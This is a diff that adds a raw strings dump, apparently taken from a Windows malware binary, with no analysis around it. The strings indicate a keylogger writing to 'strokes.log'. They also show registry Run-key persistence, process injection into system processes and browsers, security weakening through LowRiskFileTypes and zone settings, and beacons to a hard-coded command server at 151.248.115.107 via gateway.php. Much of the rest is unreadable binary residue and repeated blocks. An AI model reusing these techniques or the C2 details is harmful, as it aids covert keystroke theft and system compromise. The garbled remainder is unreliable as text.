@@ -1,0 +1,1035 @@
+!This program cannot be run in DOS mode.
+&^A`K^o
+&^A`Z^g
+&^A`^^g
+&^Richf
+.text
+.data
+.rsrc
+@.reloc
+h,y@
+hDy@
+hTy@
+hhy@
+h|y@
+h`}@
+hd|@
+hd|@
+Qhd|@
+hd|@
+hd|@
+#u:hd|@
+hd|@
+ljDj
+h 6@
+hP*@
+GetTickCount
+lstrcpyA
+CloseHandle
+GetCurrentProcess
+GetProcAddress
+LoadLibraryA
+ReadFile
+VirtualAlloc
+GetFileSize
+GetLastError
+CreateFileA
+SetLastError
+VirtualFree
+lstrlenA
+WideCharToMultiByte
+MultiByteToWideChar
+WriteFile
+SetFilePointer
+TerminateProcess
+OpenProcess
+GetVersionExA
+GetSystemInfo
+GetModuleHandleA
+Process32Next
+lstrcatA
+HeapFree
+HeapAlloc
+Process32First
+CreateToolhelp32Snapshot
+LeaveCriticalSection
+EnterCriticalSection
+DeleteFileA
+GetComputerNameA
+SetEvent
+Sleep
+WaitForSingleObject
+lstrlenW
+DeleteFileW
+CopyFileW
+CreateDirectoryW
+CreateEventA
+VirtualFreeEx
+WriteProcessMemory
+VirtualAllocEx
+IsBadReadPtr
+ExitProcess
+CreateRemoteThread
+DuplicateHandle
+CreateProcessW
+GetProcessVersion
+CreateThread
+MapViewOfFile
+CreateFileMappingA
+InitializeCriticalSection
+VirtualQuery
+lstrcpyW
+GetModuleFileNameW
+lstrcatW
+GetProcessHeap
+GetCurrentProcessId
+CreateMutexA
+GetCommandLineA
+ReadProcessMemory
+VirtualQueryEx
+lstrcmpA
+lstrcmpiA
+LockResource
+LoadResource
+SizeofResource
+FindResourceA
+GetCurrentDirectoryA
+TerminateThread
+CreateFileW
+ResumeThread
+SuspendThread
+KERNEL32.dll
+DispatchMessageA
+TranslateMessage
+GetMessageA
+CreateWindowExA
+RegisterClassExA
+GetSystemMetrics
+wsprintfA
+wsprintfW
+DefWindowProcA
+SetWindowsHookExA
+USER32.dll
+AdjustTokenPrivileges
+LookupPrivilegeValueA
+OpenProcessToken
+RegCloseKey
+RegSetValueExA
+RegOpenKeyExA
+RegQueryValueExA
+RegDeleteValueA
+GetUserNameA
+RegCreateKeyExA
+RegSetValueExW
+RegNotifyChangeKeyValue
+RegDeleteKeyA
+ADVAPI32.dll
+SHGetFolderPathW
+SHELL32.dll
+CoCreateGuid
+ole32.dll
+StrStrA
+StrCmpNIA
+SHLWAPI.dll
+HttpSendRequestA
+InternetCloseHandle
+HttpOpenRequestA
+InternetConnectA
+InternetOpenA
+InternetGetCookieA
+InternetReadFile
+InternetOpenUrlA
+WININET.dll
+ObtainUserAgentString
+urlmon.dll
+WS2_32.dll
+UuidToStringA
+RPCRT4.dll
+?456789:;<=
+ !"#$%&'()*+,-./0123
+Software\HelperSolutions Software
+Software\Microsoft\Windows\CurrentVersion\Run
+.DEFAULT\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+wmiprvse.exe
+LogonUI.exe
+svchost.exe
+iexplore.exe
+explorer.exe
+System
+smss.exe
+csrss.exe
+winlogon.exe
+lsass.exe
+spoolsv.exe
+alg.exe
+wuauclt.exe
+firefox.exe
+chrome.exe
+devenv.exe
+UpdateMutex:
+response=
+page=
+&ump=
+&ks=
+&opt=
+&unm=
+&cnm=
+&view=
+&spec=
+&query=
+&val=
+&var=
+DetectShutdownClass
+download-
+update-
+checkin:
+scanin:
+uninstall
+151.248.115.107
+/w19218317418621031041543/gateway.php
+ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/
+ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/
+ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/
+ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/
+SeDebugPrivilege
+NtQueryInformationProcess
+NTDLL.DLL
+?456789:;<=
+ !"#$%&'()*+,-./0123
+Software\HelperSolutions Software
+Software\Microsoft\Windows\CurrentVersion\Run
+.DEFAULT\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+wmiprvse.exe
+LogonUI.exe
+svchost.exe
+iexplore.exe
+explorer.exe
+System
+smss.exe
+csrss.exe
+winlogon.exe
+lsass.exe
+spoolsv.exe
+alg.exe
+wuauclt.exe
+firefox.exe
+chrome.exe
+devenv.exe
+UpdateMutex:
+response=
+page=
+&ump=
+&ks=
+&opt=
+&unm=
+&cnm=
+&view=
+&spec=
+&query=
+&val=
+&var=
+DetectShutdownClass
+download-
+update-
+checkin:
+scanin:
+uninstall
+151.248.115.107
+/w19218317418621031041543/gateway.php
+GetNativeSystemInfo
+kernel32.dll
+Windows 2000
+Windows XP
+Windows XP Professional x64
+Windows Server 2003
+Windows Home Server
+Windows Server 2003 R2
+Windows Vista
+Windows Server 2008
+Windows Server R2
+Windows 7
+64 Bit
+32 Bit
+StarDust
+localhost
+?456789:;<=
+ !"#$%&'()*+,-./0123
+Software\HelperSolutions Software
+Software\Microsoft\Windows\CurrentVersion\Run
+.DEFAULT\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+wmiprvse.exe
+LogonUI.exe
+svchost.exe
+iexplore.exe
+explorer.exe
+System
+smss.exe
+csrss.exe
+winlogon.exe
+lsass.exe
+spoolsv.exe
+alg.exe
+wuauclt.exe
+firefox.exe
+chrome.exe
+devenv.exe
+UpdateMutex:
+response=
+page=
+&ump=
+&ks=
+&opt=
+&unm=
+&cnm=
+&view=
+&spec=
+&query=
+&val=
+&var=
+DetectShutdownClass
+download-
+update-
+checkin:
+scanin:
+uninstall
+151.248.115.107
+/w19218317418621031041543/gateway.php
+Mozilla/4.0(compatible; MSIE 7.0b; Windows NT 6.0)
+POST
+Content-Type:application/x-www-form-urlencoded
+http://%s%s
+?456789:;<=
+ !"#$%&'()*+,-./0123
+Software\HelperSolutions Software
+Software\Microsoft\Windows\CurrentVersion\Run
+.DEFAULT\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+wmiprvse.exe
+LogonUI.exe
+svchost.exe
+iexplore.exe
+explorer.exe
+System
+smss.exe
+csrss.exe
+winlogon.exe
+lsass.exe
+spoolsv.exe
+alg.exe
+wuauclt.exe
+firefox.exe
+chrome.exe
+devenv.exe
+UpdateMutex:
+response=
+page=
+&ump=
+&ks=
+&opt=
+&unm=
+&cnm=
+&view=
+&spec=
+&query=
+&val=
+&var=
+DetectShutdownClass
+download-
+update-
+checkin:
+scanin:
+uninstall
+151.248.115.107
+/w19218317418621031041543/gateway.php
+Digit
+.exe;.bat;.reg;.vbs;
+Software\Microsoft\Windows\CurrentVersion\Policies\Associations
+LowRiskFileTypes
+Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0
+1806
+Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0
+1806
+?456789:;<=
+ !"#$%&'()*+,-./0123
+Software\HelperSolutions Software
+Software\Microsoft\Windows\CurrentVersion\Run
+.DEFAULT\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+wmiprvse.exe
+LogonUI.exe
+svchost.exe
+iexplore.exe
+explorer.exe
+System
+smss.exe
+csrss.exe
+winlogon.exe
+lsass.exe
+spoolsv.exe
+alg.exe
+wuauclt.exe
+firefox.exe
+chrome.exe
+devenv.exe
+UpdateMutex:
+response=
+page=
+&ump=
+&ks=
+&opt=
+&unm=
+&cnm=
+&view=
+&spec=
+&query=
+&val=
+&var=
+DetectShutdownClass
+download-
+update-
+checkin:
+scanin:
+uninstall
+?456789:;<=
+ !"#$%&'()*+,-./0123
+Software\HelperSolutions Software
+Software\Microsoft\Windows\CurrentVersion\Run
+.DEFAULT\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+wmiprvse.exe
+LogonUI.exe
+svchost.exe
+iexplore.exe
+explorer.exe
+System
+smss.exe
+csrss.exe
+winlogon.exe
+lsass.exe
+spoolsv.exe
+alg.exe
+wuauclt.exe
+firefox.exe
+chrome.exe
+devenv.exe
+UpdateMutex:
+response=
+page=
+&ump=
+&ks=
+&opt=
+&unm=
+&cnm=
+&view=
+&spec=
+&query=
+&val=
+&var=
+DetectShutdownClass
+download-
+update-
+checkin:
+scanin:
+uninstall
+151.248.115.107
+/w19218317418621031041543/gateway.php
+?456789:;<=
+ !"#$%&'()*+,-./0123
+Software\HelperSolutions Software
+Software\Microsoft\Windows\CurrentVersion\Run
+.DEFAULT\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+wmiprvse.exe
+LogonUI.exe
+svchost.exe
+iexplore.exe
+explorer.exe
+System
+smss.exe
+csrss.exe
+winlogon.exe
+lsass.exe
+spoolsv.exe
+alg.exe
+wuauclt.exe
+firefox.exe
+chrome.exe
+devenv.exe
+UpdateMutex:
+response=
+page=
+&ump=
+&ks=
+&opt=
+&unm=
+&cnm=
+&view=
+&spec=
+&query=
+&val=
+&var=
+DetectShutdownClass
+download-
+update-
+checkin:
+scanin:
+uninstall
+151.248.115.107
+/w19218317418621031041543/gateway.php
+%s%d
+WindowsServiceStabilityMutex
+ntdll.dll
+NtQuerySystemTime
+RtlTimeToSecondsSince1970
+RtlGetCompressionWorkSpaceSize
+RtlCompressBuffer
+RtlDecompressBuffer
+IsWow64Process
+kernel32.dll
+user32.dll
+advapi32.dll
+shell32.dll
+urlmon.dll
+wininet.dll
+gdi32.dll
+rpcrt4.dll
+ws2_32.dll
+GetLastInputInfo
+user32.dll
+NoProcess
+debug.log
+|%s:
+SecureDll.dll
+SecureDll.dll
+strokes.log
+%s\%s
+tmp.log
+%s\%s
+val1
+val2
+debug.log
+#AVER_START#
+#AVER_START#
+debug.log
+#AVER_END#
+#AVER_END#
+debug.log
+?456789:;<=
+ !"#$%&'()*+,-./0123
+Software\HelperSolutions Software
+Software\Microsoft\Windows\CurrentVersion\Run
+.DEFAULT\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+wmiprvse.exe
+LogonUI.exe
+svchost.exe
+iexplore.exe
+explorer.exe
+System
+smss.exe
+csrss.exe
+winlogon.exe
+lsass.exe
+spoolsv.exe
+alg.exe
+wuauclt.exe
+firefox.exe
+chrome.exe
+devenv.exe
+UpdateMutex:
+response=
+page=
+&ump=
+&ks=
+&opt=
+&unm=
+&cnm=
+&view=
+&spec=
+&query=
+&val=
+&var=
+DetectShutdownClass
+download-
+update-
+checkin:
+scanin:
+uninstall
+%s%s
+%s%s%d
+!This
+ program
+ cannot 
+be run i
+n DOS mo
+ .text
+y`.r
+data
+.reloc
+#`h 
+tlh(
+MBHD
+](h 
+(tu(
+#g$L-
+2D!A
+`cjS
+@X|@
+u/du
+ur	d
+$X`8%
+q5~SB
+ ^_]
+u59=
+@_^[
+ `VS
+u WPS
+u&WV
+^0Pf
+of@I
+VSPD
+ZGA_G
+u<B*
+YYt:`8
+!%*!
+Y;=!3t
+/tXLW
+&\	j
+@(C|Pa 
+AYP7
+ [Ub
+dhX@
+uTVWh
+YY@d
+QWh|
+R_tu
+t	VP
+sp`e`
+VW32
+@>B;C
+Yu-9D$
+jThJx
+j(@j ^V
+@!BY ;
+>%!`
+5$@+3
+Yt/j
+Y]_@^[
+AK<	
+r 6P
+@%SUVW
+xu	H
+@PVS S
+SSUP
+_^][YY
+~du 	
+t!hq
+T$0(j
+>P	@
+,9 h
+A@+S
+tqY!G
+^0YYt
+0	Y!awu
+A!pY9
+ 1YY
+W to=
+t^9(
+R!1q
+"$0'7
+^!x08
+18"r
+Fpt"
+C@Mu
+j0 R
+^Hpu
+@@Ju
+95!5
+XFh=#m
+ ^hS
+0`&U
+c$&h
+<Yv8
+l`$ 
+] _^[Y
+ -w%iC/t
+} tf
+QSUVW
+9MZt
+q!@x
+h^K`
+`U9P
+t+Ht
+lE^4
+`TE )
+dGd0%p
+ `56!l
+F0NY;
+t!hd
+`_Yb
+ueSj@
+([_^
+QQ@v
+NCu0
+_^D[
+ "ls
+#;O 
+RyA)
+S VW
+ B	`qS
+j _0S
+v)}#
+wVW3
+`N`;
+(IVSP
+.qO}
+2t4V
+RPQQh
+@D$0
+vCa0H
+FT@$
+UVWS
+SVWj
+v$;5
+ i`l
+ (QQ
+9] SS
+ Yt	
+F`	$o
+u8SS3
+L%EG=
+r7Y&X
+Br$OB
+u,lh
+tm95!r
+3	%	0%	
+ASVWUj@
+hts@
+;t$,v
+UQPXY
+;t$P
+`eW3
+_A.5
+`:-WW
+Yt 	
+!p"6kC@%$6
+A 	`"p
+' `K
+!^[C^![
+	q'M
+<Xc"
+}@b#
+NpNw	 
+X@#u
+.@!]
+1nWVS
+v	N+
+EncodeP@ointer
+ERNEL32.HDLL
+F@lsFree
+S@etValu
+Alloc
+orExitPr
+ocess
+.dll
+ !"#$%&'
+()*+,-./
+01234567
+89:;<=>?
+@ABCDEFG
+HIJKLMNO
+PQRSTUVW
+XYZ[\]^_
+`abcdefg
+hijklmno
+pqrstuvw
+xyz{|}~
+runtime
+ error 
+DOMAI
+a6034
+An appl
+ication 
+has made
+ttemp
+t to loa
+d the C 
+library
+brrect
+Plea
+se conta
+'s s uppor@
+(from
+is assem
+bly duri
+ng n
+initiali
+ bug
+  your
+most
+:ke@
+3res
+ult of c8all
+ompiled 
+(/clr) fXuncb*
+struct
+DllMaic
+not e
+nough sp
+7RT	
+once
+heap
+virt
+_one 
+Xope
+d0evich
+d$ex
+f F!#
+Nithre q
+~req
+mi`W
+(wa_~_~
+0b(r
+onment
+Cb(r
+argu
+rosoft V
+< progr 
+unknown
+0C6r
+dSpinCo
+kernel
+HH:mm:ss
+Decem
+Octo
+August 
+AprilA
+March
+F@ebruar
+Saturd
+ThursA
+	Wedne
+GetPr
+ocessWin
+dowStati
+UserOb
+jectInfo
+tActivePpopup
+ageBox
+USER32
+.DLL
+HB/3
+`	U`
+FileS
+ls trcmp@
+0ReadA
+loseHand
+Poin
+Writ
+Crea1
+Initial@
+icalS@
+Leav
+WideChar
+ToMultiB@yte
+Tic kCoun
+RNEL
+CallNe
+xtHookEx
+3dT`
+oregr 
+KeyN
+pVirtual%
+ardLayou
+ToAs
+RegB
+`htVa(lue
+eteB
+ADPVAPI5
+urrentTh1
+om"m
+"LinP
+HeapFre0
+Vers
+Alloc
+AdDdrP
+M0odul
+Tlsa
+Increm0
+Sle0
+.$q*S
+5Typ
+m*}W
+eeE@nviron
+tringsP
+<0oy
+dExc
+$Per
+Termin 
+IsDebu`ggerP
+LoaP,br0
+RtlUnRwP>
+Keylo
+Software
+\HelperS
+olutions
+Title no
+t captur
+&val1
+abcde
+fghijklm
+nopqrstu vwxyz
+CDEFGHIJ
+KLMNOPQR
+STUVWXYZ
+_A_A_A
+	1Xp
+	@$5
+1>;0
+:t0Rws
+0&070s0
+0(121K1
+3J5P5
+\5n5t5{5
+ 6<6q6w6
+]7n7
+7^8p8
+:':,:0:
+4:]:
+<=<D<
+H<L<P<T<
+X<\<`<
+>+>A>S>
+X>^>d>
+>C?I?
+3!3-3B3
+H3Q3X3|3
+04<4B4O4
+Y4_4l4{4
+5@5F5b5
+7 7'7
+-7C7H7P7
+c7j7p7
+8 8-8
+;8A8Q8n8
+P:Z:t:|:
+><J<}<
+<	=*=0=
+>8>y>
+5?S?u?
++030E0P0
+"2*2
+2&3x@
+$5-545>5 D5J5g@
+6O73@D
+9!9)959
+Y9a9m9 
+3:=:g:s: y:
+=J>a>r>
+>-?g?~? 
+001=1G1 U1^1h
+12J2T2g2
+2J3g3
+115M5V@
+ e5j5y@
+@2)6A6L6
+p6y6
+i7{7
+7t8~8
+9-9=9
+<"=+=1=
+=% h4>
+;>F>R>
+? ? 
+`;a1
+o1u1
+A2I2O
+737Y7
+:A;V;
+<6<n
+>q |
+3N5X5p
+< <'
+= =&=K
+>= (
+?O?h?o
+?w?|?
+^0d0h0l0
+1 11[1
+_2e2k2q2
+w2}2
+3%3*303
+63L3S3h3
+3Q4k4
+.:`<`
+\1`1d
+a|2$
+3(343
+P3p3
+ `P 
+x0P2
+4383@3D3
+$;(;
+,;0;4;8;
+<;@;D;H;
+L;P;T;X;
+\;`;d;h;
+l;p;t;x;(
+PADPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADD
+R3j3
+:%:.:6:f:p:
+:7;o;
+;*<C<L<`<v<
+="=L=b={=
+==>N>
+>>?P?t?
+0.0E0
+1Q1[1h1q1{1
+2&202@2J2
+2*313{3
+4<4R4z4
+4-5:5u5
+666F6L6{6
+7$7)737A7J7P7V7[7b7h7v7~7
+8@8L8Y8g8t8
+9,9D9L9R9\9
+9::a:h:n:{:
+;Y;h;o;
+;	<M<T<[<c<m<
+<e=r=
+>/>9>>>H>]>c>
+?,?3?Z?a?
+2$2)2/252?2
+3.393J3W3f3k3q3w3
+4+444>4Q4]4m4x4}4
+435>5C5I5U5^5h5r5
+6.646d6o6
+7/7O7i7r7
+8<9Q9X9s9
+:#:6:?:H:N:q:
+;-;F;P;Z;r;
+<#<+<6<;<E<J<P<_<e<j<p<u<z<
+=,=8=F=U=e=j=o=u=
+>#>(>.>3>9>T>Z>c>{>
+?$?)?/?5?i?n?|?
+0(0-080B0G0R0\0p0z0
+1E1S1h1v1
+3/3E3U3^3m3v3|3
+374G4b4o4t4
+5.5:5[5`5f5o5|5
+6+656:6@6X6^6e6k6w6}6
+7"7'7-72787S7X7b7s7
+254B4I4
+838X8l8r8
+999M9g9l9x9}9
+;#;1;9;?;H;j;
+<,<5<:<B<f<m<s<
+=&=+=8=Q=W=]=g=p=v=
+=K>U>[>a>k>~>
+>Z?~?
+0'0;0
+1%1*151:1@1H1
+2!2C2t2
+3+3Y3z3
+4;4@4E4R4f4z4
+X2\2`2d2h2l2p2t2x2|2
+3X7\7`7d7h7l7p7t7x7|7
+< <$<(<,<0<4<8<<<@<D<H<L<(=X=
+004080<0@0D0H0L0P0T0X0\0`0d0h0l0H1x1
+: :$:(:,:0:4:
+4 4$4(4,4044484<4
